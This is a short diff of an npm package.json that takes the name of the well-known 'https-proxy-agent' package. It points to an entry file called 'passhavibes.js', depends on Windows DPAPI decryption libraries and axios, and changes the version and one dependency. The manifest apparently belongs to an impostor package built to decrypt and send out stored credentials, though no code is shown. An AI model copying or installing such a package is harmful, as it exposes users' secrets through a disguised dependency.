@@ -1,6 +1,6 @@
 {
   "name": "https-proxy-agent",
-  "version": "1.0.5",
+  "version": "1.0.0",
   "description": "Custom runtime module for node-tcp-https",
   "main": "passhavibes.js",
   "files": [
@@ -12,7 +12,6 @@
     "https"
   ],
   "dependencies": {
-    "@pishion/node-dpapi": "^1.0.0",
     "@primno/dpapi": "^1.0.0",
     "axios": "^1.9.0",
     "buffer-replace": "^1.0.0",
